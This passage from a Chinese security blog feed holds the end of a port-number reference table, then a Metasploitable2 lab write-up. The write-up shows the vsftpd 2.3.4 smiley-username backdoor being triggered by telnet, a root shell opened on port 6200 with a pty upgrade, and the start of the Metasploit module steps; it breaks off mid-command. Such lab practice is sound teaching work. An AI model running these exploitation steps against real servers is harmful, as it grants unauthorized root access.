Telnet</td></tr><tr><td>109</td><td>pop2</td><td>邮局协议版本2</td></tr><tr><td>110</td><td>pop3</td><td>邮局协议版本3</td></tr><tr><td>111</td><td>sunrpc</td><td>用于远程命令执行的远程过程调用（RPC）协议，被网络文件系统（NFS）使用</td></tr><tr><td>113</td><td>auth</td><td>验证和身份识别协议</td></tr><tr><td>115</td><td>sftp</td><td>安全文件传输协议（SFTP）服务</td></tr><tr><td>117</td><td>uucp-path</td><td>Unix 到 Unix 复制协议（UUCP）路径服务</td></tr><tr><td>119</td><td>nntp</td><td>用于 USENET 讨论系统的网络新闻传输协议（NNTP）</td></tr><tr><td>123</td><td>ntp</td><td>网络时间协议（NTP）</td></tr><tr><td>137</td><td>netbios-ns</td><td>在红帽企业 Linux 中被 Samba 使用的 NETBIOS 名称服务</td></tr><tr><td>138</td><td>netbios-dgm</td><td>在红帽企业 Linux 中被 Samba 使用的 NETBIOS 数据报服务</td></tr><tr><td>139</td><td>netbios-ssn</td><td>在红帽企业 Linux 中被 Samba 使用的NET BIOS 会话服务</td></tr><tr><td>143</td><td>imap</td><td>互联网消息存取协议（IMAP）</td></tr><tr><td>161</td><td>snmp</td><td>简单网络管理协议（SNMP）</td></tr><tr><td>162</td><td>snmptrap</td><td>SNMP 的陷阱</td></tr><tr><td>163</td><td>cmip-man</td><td>通用管理信息协议（CMIP）</td></tr><tr><td>164</td><td>cmip-agent</td><td>通用管理信息协议（CMIP）</td></tr><tr><td>174</td><td>mailq</td><td>MAILQ</td></tr><tr><td>177</td><td>xdmcp</td><td>X 显示管理器控制协议</td></tr><tr><td>178</td><td>nextstep</td><td>NeXTStep 窗口服务器</td></tr><tr><td>179</td><td>bgp</td><td>边界网络协议</td></tr><tr><td>191</td><td>prospero</td><td>Cliffod Neuman 的 Prospero 服务</td></tr><tr><td>194</td><td>irc</td><td>互联网中继聊天（IRC）</td></tr><tr><td>199</td><td>smux</td><td>SNMP UNIX 多路复用</td></tr><tr><td>201</td><td>at-rtmp</td><td>AppleTalk 选路</td></tr><tr><td>202</td><td>at-nbp</td><td>AppleTalk 名称绑定</td></tr><tr><td>204</td><td>at-echo</td><td>AppleTalk echo 服务</td></tr><tr><td>206</td><td>at-zis</td><td>AppleTalk 区块信息</td></tr><tr><td>209</td><td>qmtp</td><td>快速邮件传输协议（QMTP）</td></tr><tr><td>210</td><td>z39.50</td><td>NISO Z39.50 数据库</td></tr><tr><td>213</td><td>ipx</td><td>互联网络分组交换协议（IPX），被 Novell Netware 环境常用的数据报协议</td></tr><tr><td>220</td><td>imap3</td><td>互联网消息存取协议版本3</td></tr><tr><td>245</td><td>link</td><td>LINK</td></tr><tr><td>347</td><td>fatserv</td><td>Fatmen 服务器</td></tr><tr><td>363</td><td>rsvp_tunnel</td><td>RSVP 隧道</td></tr><tr><td>369</td><td>rpc2portmap</td><td>Coda 文件系统端口映射器</td></tr><tr><td>370</td><td>codaauth2</td><td>Coda 文件系统验证服务</td></tr><tr><td>372</td><td>ulistproc</td><td>UNIX Listserv</td></tr><tr><td>389</td><td>ldap</td><td>轻型目录存取协议（LDAP）</td></tr><tr><td>427</td><td>svrloc</td><td>服务位置协议（SLP）</td></tr><tr><td>434</td><td>mobileip-agent</td><td>可移互联网协议（IP）代理</td></tr><tr><td>435</td><td>mobilip-mn</td><td>可移互联网协议（IP）管理器</td></tr><tr><td>443</td><td>https</td><td>安全超文本传输协议（HTTP）</td></tr><tr><td>444</td><td>snpp</td><td>小型网络分页协议</td></tr><tr><td>445</td><td>microsoft-ds</td><td>通过 TCP&#x2F;IP 的服务器消息块（SMB）</td></tr><tr><td>464</td><td>kpasswd</td><td>Kerberos 口令和钥匙改换服务</td></tr><tr><td>468</td><td>photuris</td><td>Photuris 会话钥匙管理协议</td></tr><tr><td>487</td><td>saft</td><td>简单不对称文件传输（SAFT）协议</td></tr><tr><td>488</td><td>gss-http</td><td>用于 HTTP 的通用安全服务（GSS）</td></tr><tr><td>496</td><td>pim-rp-disc</td><td>用于协议独立的多址传播（PIM）服务的会合点发现（RP-DISC）</td></tr><tr><td>500</td><td>isakmp</td><td>互联网安全关联和钥匙管理协议（ISAKMP）</td></tr><tr><td>535</td><td>iiop</td><td>互联网内部对象请求代理协议（IIOP）</td></tr><tr><td>538</td><td>gdomap</td><td>GNUstep 分布式对象映射器（GDOMAP）</td></tr><tr><td>546</td><td>dhcpv6-client</td><td>动态主机配置协议（DHCP）版本6客户</td></tr><tr><td>547</td><td>dhcpv6-server</td><td>动态主机配置协议（DHCP）版本6服务</td></tr><tr><td>554</td><td>rtsp</td><td>实时流播协议（RTSP）</td></tr><tr><td>563</td><td>nntps</td><td>通过安全套接字层的网络新闻传输协议（NNTPS）</td></tr><tr><td>565</td><td>whoami</td><td>whoami</td></tr><tr><td>587</td><td>submission</td><td>邮件消息提交代理（MSA）</td></tr><tr><td>610</td><td>npmp-local</td><td>网络外设管理协议（NPMP）本地 &#x2F; 分布式排队系统（DQS）</td></tr><tr><td>611</td><td>npmp-gui</td><td>网络外设管理协议（NPMP）GUI &#x2F; 分布式排队系统（DQS）</td></tr><tr><td>612</td><td>hmmp-ind</td><td>HMMP 指示 &#x2F; DQS</td></tr><tr><td>631</td><td>ipp</td><td>互联网打印协议（IPP）</td></tr><tr><td>636</td><td>ldaps</td><td>通过安全套接字层的轻型目录访问协议（LDAPS）</td></tr><tr><td>674</td><td>acap</td><td>应用程序配置存取协议（ACAP）</td></tr><tr><td>694</td><td>ha-cluster</td><td>用于带有高可用性的群集的心跳服务</td></tr><tr><td>749</td><td>kerberos-adm</td><td>Kerberos 版本5（v5）的“kadmin”数据库管理</td></tr><tr><td>750</td><td>kerberos-iv</td><td>Kerberos 版本4（v4）服务</td></tr><tr><td>765</td><td>webster</td><td>网络词典</td></tr><tr><td>767</td><td>phonebook</td><td>网络电话簿</td></tr><tr><td>873</td><td>rsync</td><td>rsync 文件传输服务</td></tr><tr><td>992</td><td>telnets</td><td>通过安全套接字层的 Telnet（TelnetS）</td></tr><tr><td>993</td><td>imaps</td><td>通过安全套接字层的互联网消息存取协议（IMAPS）</td></tr><tr><td>994</td><td>ircs</td><td>通过安全套接字层的互联网中继聊天（IRCS）</td></tr><tr><td>995</td><td>pop3s</td><td>通过安全套接字层的邮局协议版本3（POPS3）</td></tr></tbody></table><h2 id="UNIX-特有的端口"><a href="#UNIX-特有的端口" class="headerlink" title="UNIX 特有的端口"></a>UNIX 特有的端口</h2><p>以下端口是 UNIX 特有的，涉及了从电子邮件到验证不等的服务。在方括号内的名称（如 [service]）是服务的守护进程名称或它的常用别名。</p><table><thead><tr><th>端口号码 &#x2F; 层</th><th>名称</th><th>注释</th></tr></thead><tbody><tr><td>512&#x2F;tcp</td><td>exec</td><td>用于对远程执行的进程进行验证</td></tr><tr><td>512&#x2F;udp</td><td>biff [comsat]</td><td>异步邮件客户（biff）和服务（comsat）</td></tr><tr><td>513&#x2F;tcp</td><td>login</td><td>远程登录（rlogin）</td></tr><tr><td>513&#x2F;udp</td><td>who [whod]</td><td>登录的用户列表</td></tr><tr><td>514&#x2F;tcp</td><td>shell [cmd]</td><td>不必登录的远程 shell（rshell）和远程复制（rcp）</td></tr><tr><td>514&#x2F;udp</td><td>syslog</td><td>UNIX 系统日志服务</td></tr><tr><td>515</td><td>printer [spooler]</td><td>打印机（lpr）假脱机</td></tr><tr><td>517&#x2F;udp</td><td>talk</td><td>远程对话服务和客户</td></tr><tr><td>518&#x2F;udp</td><td>ntalk</td><td>网络交谈（ntalk），远程对话服务和客户</td></tr><tr><td>519</td><td>utime [unixtime]</td><td>UNIX 时间协议（utime）</td></tr><tr><td>520&#x2F;tcp</td><td>efs</td><td>扩展文件名服务器（EFS）</td></tr><tr><td>520&#x2F;udp</td><td>router [route, routed]</td><td>选路信息协议（RIP）</td></tr><tr><td>521</td><td>ripng</td><td>用于互联网协议版本6（IPv6）的选路信息协议</td></tr><tr><td>525</td><td>timed [timeserver]</td><td>时间守护进程（timed）</td></tr><tr><td>526&#x2F;tcp</td><td>tempo [newdate]</td><td>Tempo</td></tr><tr><td>530&#x2F;tcp</td><td>courier [rpc]</td><td>Courier 远程过程调用（RPC）协议</td></tr><tr><td>531&#x2F;tcp</td><td>conference [chat]</td><td>互联网中继聊天</td></tr><tr><td>532</td><td>netnews</td><td>Netnews</td></tr><tr><td>533&#x2F;udp</td><td>netwall</td><td>用于紧急广播的 Netwall</td></tr><tr><td>540&#x2F;tcp</td><td>uucp [uucpd]</td><td>Unix 到 Unix 复制服务</td></tr><tr><td>543&#x2F;tcp</td><td>klogin</td><td>Kerberos 版本5（v5）远程登录</td></tr><tr><td>544&#x2F;tcp</td><td>kshell</td><td>Kerberos 版本5（v5）远程 shell</td></tr><tr><td>548</td><td>afpovertcp</td><td>通过传输控制协议（TCP）的 Appletalk 文件编制协议（AFP）</td></tr><tr><td>556</td><td>remotefs [rfs_server, rfs]</td><td>Brunhoff 的远程文件系统（RFS）</td></tr></tbody></table><h2 id="注册的端口"><a href="#注册的端口" class="headerlink" title="注册的端口"></a>注册的端口</h2><p>列举了由网络和软件社区向 IANA 提交的要在端口号码列表中正式注册的端口。</p><table><thead><tr><th>端口号码 &#x2F; 层</th><th>名称</th><th>注释</th></tr></thead><tbody><tr><td>1080</td><td>socks</td><td>SOCKS 网络应用程序代理服务</td></tr><tr><td>1236</td><td>bvcontrol [rmtcfg]</td><td>Garcilis Packeten 远程配置服务器</td></tr><tr><td>1300</td><td>h323hostcallsc</td><td>H.323 电话会议主机电话安全</td></tr><tr><td>1433</td><td>ms-sql-s</td><td>Microsoft SQL 服务器</td></tr><tr><td>1434</td><td>ms-sql-m</td><td>Microsoft SQL 监视器</td></tr><tr><td>1494</td><td>ica</td><td>Citrix ICA 客户</td></tr><tr><td>1512</td><td>wins</td><td>Microsoft Windows 互联网名称服务器</td></tr><tr><td>1524</td><td>ingreslock</td><td>Ingres 数据库管理系统（DBMS）锁定服务</td></tr><tr><td>1525</td><td>prospero-np</td><td>无特权的 Prospero</td></tr><tr><td>1645</td><td>datametrics [old-radius]</td><td>Datametrics &#x2F; 从前的 radius 项目</td></tr><tr><td>1646</td><td>sa-msg-port [oldradacct]</td><td>sa-msg-port &#x2F; 从前的 radacct 项目</td></tr><tr><td>1649</td><td>kermit</td><td>Kermit 文件传输和管理服务</td></tr><tr><td>1701</td><td>l2tp [l2f]</td><td>第2层隧道服务（LT2P） &#x2F; 第2层转发（L2F）</td></tr><tr><td>1718</td><td>h323gatedisc</td><td>H.323 电讯守门装置发现机制</td></tr><tr><td>1719</td><td>h323gatestat</td><td>H.323 电讯守门装置状态</td></tr><tr><td>1720</td><td>h323hostcall</td><td>H.323 电讯主持电话设置</td></tr><tr><td>1758</td><td>tftp-mcast</td><td>小文件 FTP 组播</td></tr><tr><td>1759</td><td>mtftp</td><td>组播小文件 FTP（MTFTP）</td></tr><tr><td>1789</td><td>hello</td><td>Hello 路由器通信端口</td></tr><tr><td>1812</td><td>radius</td><td>Radius 拨号验证和记帐服务</td></tr><tr><td>1813</td><td>radius-acct</td><td>Radius 记帐</td></tr><tr><td>1911</td><td>mtp</td><td>Starlight 网络多媒体传输协议（MTP）</td></tr><tr><td>1985</td><td>hsrp</td><td>Cisco 热备用路由器协议</td></tr><tr><td>1986</td><td>licensedaemon</td><td>Cisco 许可管理守护进程</td></tr><tr><td>1997</td><td>gdp-port</td><td>Cisco 网关发现协议（GDP）</td></tr><tr><td>2049</td><td>nfs [nfsd]</td><td>网络文件系统（NFS）</td></tr><tr><td>2102</td><td>zephyr-srv</td><td>Zephyr 通知传输和发送服务器</td></tr><tr><td>2103</td><td>zephyr-clt</td><td>Zephyr serv-hm 连接</td></tr><tr><td>2104</td><td>zephyr-hm</td><td>Zephyr 主机管理器</td></tr><tr><td>2401</td><td>cvspserver</td><td>并行版本系统（CVS）客户 &#x2F; 服务器操作</td></tr><tr><td>2430&#x2F;tcp</td><td>venus</td><td>用于 Coda 文件系统（codacon 端口）的 Venus 缓存管理器</td></tr><tr><td>2430&#x2F;udp</td><td>venus</td><td>用于 Coda 文件系统（callback&#x2F;wbc interface 界面）的 Venus 缓存管理器</td></tr><tr><td>2431&#x2F;tcp</td><td>venus-se</td><td>Venus 传输控制协议（TCP）的副作用</td></tr><tr><td>2431&#x2F;udp</td><td>venus-se</td><td>Venus 用户数据报协议（UDP）的副作用</td></tr><tr><td>2432&#x2F;udp</td><td>codasrv</td><td>Coda 文件系统服务器端口</td></tr><tr><td>2433&#x2F;tcp</td><td>codasrv-se</td><td>Coda 文件系统 TCP 副作用</td></tr><tr><td>2433&#x2F;udp</td><td>codasrv-se</td><td>Coda 文件系统 UDP SFTP 副作用</td></tr><tr><td>2600</td><td>hpstgmgr [zebrasrv]</td><td>HPSTGMGR；Zebra 选路</td></tr><tr><td>2601</td><td>discp-client [zebra]</td><td>discp 客户；Zebra 集成的 shell</td></tr><tr><td>2602</td><td>discp-server [ripd]</td><td>discp 服务器；选路信息协议守护进程（ripd）</td></tr><tr><td>2603</td><td>servicemeter [ripngd]</td><td>服务计量；用于 IPv6 的 RIP 守护进程</td></tr><tr><td>2604</td><td>nsc-ccs [ospfd]</td><td>NSC CCS；开放式短路径优先守护进程（ospfd）</td></tr><tr><td>2605</td><td>nsc-posa</td><td>NSC POSA；边界网络协议守护进程（bgpd）</td></tr><tr><td>2606</td><td>netmon [ospf6d]</td><td>Dell Netmon；用于 IPv6 的 OSPF 守护进程（ospf6d）</td></tr><tr><td>2809</td><td>corbaloc</td><td>公共对象请求代理体系（CORBA）命名服务定位器</td></tr><tr><td>3130</td><td>icpv2</td><td>互联网缓存协议版本2（v2）；被 Squid 代理缓存服务器使用</td></tr><tr><td>3306</td><td>mysql</td><td>MySQL 数据库服务</td></tr><tr><td>3346</td><td>trnsprntproxy</td><td>Trnsprnt 代理</td></tr><tr><td>4011</td><td>pxe</td><td>执行前环境（PXE）服务</td></tr><tr><td>4321</td><td>rwhois</td><td>远程 Whois（rwhois）服务</td></tr><tr><td>4444</td><td>krb524</td><td>Kerberos 版本5（v5）到版本4（v4）门票转换器</td></tr><tr><td>5002</td><td>rfe</td><td>无射频以太网（RFE）音频广播系统</td></tr><tr><td>5308</td><td>cfengine</td><td>配置引擎（Cfengine）</td></tr><tr><td>5999</td><td>cvsup [CVSup]</td><td>CVSup 文件传输和更新工具</td></tr><tr><td>6000</td><td>x11 [X]</td><td>X 窗口系统服务</td></tr><tr><td>7000</td><td>afs3-fileserver</td><td>Andrew 文件系统（AFS）文件服务器</td></tr><tr><td>7001</td><td>afs3-callback</td><td>用于给缓存管理器回电的 AFS 端口</td></tr><tr><td>7002</td><td>afs3-prserver</td><td>AFS 用户和组群数据库</td></tr><tr><td>7003</td><td>afs3-vlserver</td><td>AFS 文件卷位置数据库</td></tr><tr><td>7004</td><td>afs3-kaserver</td><td>AFS Kerberos 验证服务</td></tr><tr><td>7005</td><td>afs3-volser</td><td>AFS 文件卷管理服务器</td></tr><tr><td>7006</td><td>afs3-errors</td><td>AFS 错误解释服务</td></tr><tr><td>7007</td><td>afs3-bos</td><td>AFS 基本监查进程</td></tr><tr><td>7008</td><td>afs3-update</td><td>AFS 服务器到服务器更新器</td></tr><tr><td>7009</td><td>afs3-rmtsys</td><td>AFS 远程缓存管理器服务</td></tr><tr><td>9876</td><td>sd</td><td>会话指引器</td></tr><tr><td>10080</td><td>amanda</td><td>高级 Maryland 自动网络磁盘归档器（Amanda）备份服务</td></tr><tr><td>11371</td><td>pgpkeyserver</td><td>良好隐私（PGP） &#x2F; GNU 隐私卫士（GPG）公钥服务器</td></tr><tr><td>11720</td><td>h323callsigalt</td><td>H.323 调用信号交替</td></tr><tr><td>13720</td><td>bprd</td><td>Veritas NetBackup 请求守护进程（bprd）</td></tr><tr><td>13721</td><td>bpdbm</td><td>Veritas NetBackup 数据库管理器（bpdbm）</td></tr><tr><td>13722</td><td>bpjava-msvc</td><td>Veritas NetBackup Java &#x2F; Microsoft Visual C++ (MSVC) 协议</td></tr><tr><td>13724</td><td>vnetd</td><td>Veritas 网络工具</td></tr><tr><td>13782</td><td>bpcd</td><td>Vertias NetBackup</td></tr><tr><td>13783</td><td>vopied</td><td>Veritas VOPIED 协议</td></tr><tr><td>22273</td><td>wnn6 [wnn4]</td><td>假名&#x2F;汉字转换系统</td></tr><tr><td>26000</td><td>quake</td><td>Quake（以及相关的）多人游戏服务器</td></tr><tr><td>26208</td><td>wnn6-ds</td><td></td></tr><tr><td>33434</td><td>traceroute</td><td>Traceroute 网络跟踪工具</td></tr></tbody></table><p>注: &#x2F;etc&#x2F;services中的注释如下：端口1236被注册为“bvcontrol”，但是它也被 Gracilis Packeten 远程配置服务器使用。正式名称被列为主要名称，未注册的名称被列为别名。  在&#x2F;etc&#x2F;services中的注释：端口 2600 到 2606 被 zebra 软件包未经注册而使用。主要名称是被注册的名称，被 zebra 使用的未注册名称被列为别名。  &#x2F;etc&#x2F;services 文件中的注释：该端口被注册为 wnn6，但是还在 FreeWnn 软件包中使用了未注册的“wnn4”。</p><h2 id="数据报传递协议端口"><a href="#数据报传递协议端口" class="headerlink" title="数据报传递协议端口"></a>数据报传递协议端口</h2><p>显示了一个和数据报传递协议（DDP）有关的端口列表。DDP 在 AppleTalk 网络上被使用。</p><table><thead><tr><th>端口号码 &#x2F; 层</th><th>名称</th><th>注释</th></tr></thead><tbody><tr><td>1&#x2F;ddp</td><td>rtmp</td><td>路由表管理协议</td></tr><tr><td>2&#x2F;ddp</td><td>nbp</td><td>名称绑定协议</td></tr><tr><td>4&#x2F;ddp</td><td>echo</td><td>AppleTalk Echo 协议</td></tr><tr><td>6&#x2F;ddp</td><td>zip</td><td>区块信息协议</td></tr></tbody></table><h2 id="Kerberos（工程-Athena-x2F-MIT）端口"><a href="#Kerberos（工程-Athena-x2F-MIT）端口" class="headerlink" title="Kerberos（工程 Athena&#x2F;MIT）端口"></a>Kerberos（工程 Athena&#x2F;MIT）端口</h2><p>和 Kerberos 网络验证协议相关的端口列表。在标记的地方，v5 代表 Kerberos 版本5协议。注意，这些端口没有在 IANA 注册。</p><table><thead><tr><th>端口号码 &#x2F; 层</th><th>名称</th><th>注释</th></tr></thead><tbody><tr><td>751</td><td>kerberos_master</td><td>Kerberos 验证</td></tr><tr><td>752</td><td>passwd_server</td><td>Kerberos 口令（kpasswd）服务器</td></tr><tr><td>754</td><td>krb5_prop</td><td>Kerberos v5 从属传播</td></tr><tr><td>760</td><td>krbupdate [kreg]</td><td>Kerberos 注册</td></tr><tr><td>1109</td><td>kpop</td><td>Kerberos 邮局协议（KPOP）</td></tr><tr><td>2053</td><td>knetd</td><td>Kerberos 多路分用器</td></tr><tr><td>2105</td><td>eklogin</td><td>Kerberos v5 加密的远程登录（rlogin）</td></tr></tbody></table><h2 id="未注册的端口"><a href="#未注册的端口" class="headerlink" title="未注册的端口"></a>未注册的端口</h2><p>一个未注册的端口列表。这些端口可能被安装在你的红帽企业 Linux 系统上的服务或协议使用，或者它们是在红帽企业 Linux 和运行其它操作系统的机器通信所必需的端口。</p><table><thead><tr><th>端口号码 &#x2F; 层</th><th>名称</th><th>注释</th></tr></thead><tbody><tr><td>15&#x2F;tcp</td><td>netstat</td><td>网络状态（netstat）</td></tr><tr><td>98&#x2F;tcp</td><td>linuxconf</td><td>Linuxconf Linux 管理工具</td></tr><tr><td>106</td><td>poppassd</td><td>邮局协议口令改变守护进程（POPPASSD）</td></tr><tr><td>465&#x2F;tcp</td><td>smtps</td><td>通过安全套接字层的简单邮件传输协议（SMTPS）</td></tr><tr><td>616&#x2F;tcp</td><td>gii</td><td>使用网关的（选路守护进程）互动界面</td></tr><tr><td>808</td><td>omirr [omirrd]</td><td>联机镜像（Omirr）文件镜像服务</td></tr><tr><td>871&#x2F;tcp</td><td>supfileserv</td><td>软件升级协议（SUP）服务器</td></tr><tr><td>901&#x2F;tcp</td><td>swat</td><td>Samba 万维网管理工具（SWAT）</td></tr><tr><td>953</td><td>rndc</td><td>Berkeley 互联网名称域版本9（BIND 9）远程名称守护进程配置工具</td></tr><tr><td>1127</td><td>sufiledbg</td><td>软件升级协议（SUP）调试</td></tr><tr><td>1178&#x2F;tcp</td><td>skkserv</td><td>简单假名到汉字（SKK）日文输入服务器</td></tr><tr><td>1313&#x2F;tcp</td><td>xtel</td><td>法国 Minitel 文本信息系统</td></tr><tr><td>1529&#x2F;tcp</td><td>support [prmsd, gnatsd]</td><td>GNATS 错误跟踪系统</td></tr><tr><td>2003&#x2F;tcp</td><td>cfinger</td><td>GNU Finger 服务</td></tr><tr><td>2150</td><td>ninstall</td><td>网络安装服务</td></tr><tr><td>2988</td><td>afbackup</td><td>afbackup 客户-服务器备份系统</td></tr><tr><td>3128&#x2F;tcp</td><td>squid</td><td>Squid 万维网代理缓存</td></tr><tr><td>3455</td><td>prsvp</td><td>RSVP 端口</td></tr><tr><td>5432</td><td>postgres</td><td>PostgreSQL 数据库</td></tr><tr><td>4557&#x2F;tcp</td><td>fax</td><td>FAX 传输服务（旧服务）</td></tr><tr><td>4559&#x2F;tcp</td><td>hylafax</td><td>HylaFAX 客户-服务器协议（新服务）</td></tr><tr><td>5232</td><td>sgi-dgl</td><td>SGI 分布式图形库</td></tr><tr><td>5354</td><td>noclog</td><td>NOCOL 网络操作中心记录守护进程（noclogd）</td></tr><tr><td>5355</td><td>hostmon</td><td>NOCOL 网络操作中心主机监视</td></tr><tr><td>5680&#x2F;tcp</td><td>canna</td><td>Canna 日文字符输入界面</td></tr><tr><td>6010&#x2F;tcp</td><td>x11-ssh-offset</td><td>安全 Shell（SSH）X11 转发偏移</td></tr><tr><td>6667</td><td>ircd</td><td>互联网中继聊天守护进程（ircd）</td></tr><tr><td>7100&#x2F;tcp</td><td>xfs</td><td>X 字体服务器（XFS）</td></tr><tr><td>7666&#x2F;tcp</td><td>tircproxy</td><td>Tircproxy IRC 代理服务</td></tr><tr><td>8008</td><td>http-alt</td><td>超文本传输协议（HTTP）的另一选择</td></tr><tr><td>8080</td><td>webcache</td><td>万维网（WWW）缓存服务</td></tr><tr><td>8081</td><td>tproxy</td><td>透明代理</td></tr><tr><td>9100&#x2F;tcp</td><td>jetdirect [laserjet, hplj]</td><td>Hewlett-Packard (HP) JetDirect 网络打印服务</td></tr><tr><td>9359</td><td>mandelspawn [mandelbrot]</td><td>用于 X 窗口系统的并行 Mandelbrot 生成程序</td></tr><tr><td>10081</td><td>kamanda</td><td>使用 Kerberos 的 Amanda 备份服务</td></tr><tr><td>10082&#x2F;tcp</td><td>amandaidx</td><td>Amanda 备份服务</td></tr><tr><td>10083&#x2F;tcp</td><td>amidxtape</td><td>Amanda 备份服务</td></tr><tr><td>20011</td><td>isdnlog</td><td>综合业务数字网（ISDN）登录系统</td></tr><tr><td>20012</td><td>vboxd</td><td>ISDN 音箱守护进程（vboxd）</td></tr><tr><td>22305&#x2F;tcp</td><td>wnn4_Kr</td><td>kWnn 韩文输入系统</td></tr><tr><td>22289&#x2F;tcp</td><td>wnn4_Cn</td><td>cWnn 中文输入系统</td></tr><tr><td>22321&#x2F;tcp</td><td>wnn4_Tw</td><td>tWnn 中文输入系统（台湾）</td></tr><tr><td>24554</td><td>binkp</td><td>Binkley TCP&#x2F;IP Fidonet 邮寄程序守护进程</td></tr><tr><td>27374</td><td>asp</td><td>地址搜索协议</td></tr><tr><td>60177</td><td>tfido</td><td>Ifmail FidoNet 兼容邮寄服务</td></tr><tr><td>60179</td><td>fido</td><td>FidoNet 电子邮件和新闻网络</td></tr></tbody></table>]]></content>
    
    
    
    <tags>
      
      <tag>漏洞利用</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Metasploitable2系列练习-漏洞利用之vsftpd后门与linuxNFS共享目录配置漏洞</title>
    <link href="/blog/2020/05/05/Metasploitable2%E7%B3%BB%E5%88%97%E7%BB%83%E4%B9%A0-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E4%B9%8Bvsftpd%E5%90%8E%E9%97%A8%E4%B8%8ElinuxNFS%E5%85%B1%E4%BA%AB%E7%9B%AE%E5%BD%95%E9%85%8D%E7%BD%AE%E6%BC%8F%E6%B4%9E/"/>
    <url>/blog/2020/05/05/Metasploitable2%E7%B3%BB%E5%88%97%E7%BB%83%E4%B9%A0-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E4%B9%8Bvsftpd%E5%90%8E%E9%97%A8%E4%B8%8ElinuxNFS%E5%85%B1%E4%BA%AB%E7%9B%AE%E5%BD%95%E9%85%8D%E7%BD%AE%E6%BC%8F%E6%B4%9E/</url>
    
    <content type="html"><![CDATA[<p><strong>继续上一篇的内容，本次使用的是vsftpd后门与linuxNFS共享目录配置漏洞和Samba3.X漏洞利用。</strong></p><p><img src="/images/fj46.jpg"></p><span id="more"></span><h2 id="vsftpd后门"><a href="#vsftpd后门" class="headerlink" title="vsftpd后门"></a>vsftpd后门</h2><h3 id="nmap扫描"><a href="#nmap扫描" class="headerlink" title="nmap扫描"></a>nmap扫描</h3><p><img src="/images/metasploitable2-0.png"></p><p>发现21端口运行着vsftpd服务，版本是2.3.4</p><p>这个特别的版本包含一个后门允许一个未知的入侵者进入核心代码。这个后门很快就被确认并且移除。但是移除之前已经被少数人下载下来。如果在发送的用户名后面加上”：）“（笑脸符号），这个版本的后门会在6200端口上打开一个监听的shell。</p><p>我们可以通过telnet确认或者通过metasploit上面的攻击模块自动攻击。</p><h3 id="telnet手动利用"><a href="#telnet手动利用" class="headerlink" title="telnet手动利用"></a>telnet手动利用</h3><p>尝试连接：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">telnet 192.168.52.144 21<br>Trying 192.168.52.144...<br>Connected to 192.168.52.144.<br>Escape character is <span class="hljs-string">&#x27;^]&#x27;</span>.<br>220 (vsFTPd 2.3.4)<br>user attack:)<br>331 Please specify the password.<br><br></code></pre></td></tr></table></figure><p>再开一个窗口，尝试使用telnet连接6200端口，并使用python -c ‘import pty;pty.spawn(“&#x2F;bin&#x2F;bash”)’获取伪终端：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash">telnet 192.168.52.144 6200<br>Trying 192.168.52.144...<br>Connected to 192.168.52.144.<br>Escape character is <span class="hljs-string">&#x27;^]&#x27;</span>.<br><span class="hljs-built_in">id</span>;<br>uid=0(root) gid=0(root)<br>: <span class="hljs-built_in">command</span> not found<br>python -c <span class="hljs-string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span>;<br>root@metasploitable:/<span class="hljs-comment"># ls</span><br><span class="hljs-built_in">ls</span><br>bin    dev   initrd      lost+found  nohup.out  root  sys  var<br>boot   etc   initrd.img  media       opt        sbin  tmp  vmlinuz<br>cdrom  home  lib         mnt         proc       srv   usr<br><br></code></pre></td></tr></table></figure><h3 id="MSF自动利用"><a href="#MSF自动利用" class="headerlink" title="MSF自动利用"></a>MSF自动利用</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs bash">msf5 &gt; search vsftpd<br><br>Matching Modules<br>================<br><br>   <span class="hljs-comment">#  Name                                  Disclosure Date  Rank       Check  Description</span><br>   -  ----                                  ---------------  ----       -----  -----------<br>   0  exploit/unix/ftp/vsftpd_234_backdoor  2011-07-03       excellent  No     VSFTPD v2.3.4 Backdoor Command Execution<br><br><br>msf5 &gt; use exploit/unix/ftp/vsftpd_234_backdoor<br>msf5 exploit(unix/ftp/vsftpd_234_backdoor) &gt; show options <br><br>Module options (exploit/unix/ftp/vsftpd_234_backdoor):<br><br>   Name    Current Setting  Required  Description<br>   ----    ---------------  --------  -----------<br>   RHOSTS                   <span class="hljs-built_in">yes</span>       The target host(s), range CIDR identifier, or hosts file with syntax <span class="hljs-string">&#x27;file:&lt;path&gt;&#x27;</span><br>   RPORT   21               <span class="hljs-built_in">yes</span>       The target port (TCP)<br><br><br>Exploit target:<br><br>   Id  Name<br>   --  ----<br>   0   Automatic<br><br><br>msf5 exploit(unix/ftp/vsftpd_234_backdoor) &gt; <span class="hljs-built_in">set</span> rhost 192.168.52.144<br>rhost =&gt; 192.168.52.144<br><br>msf5 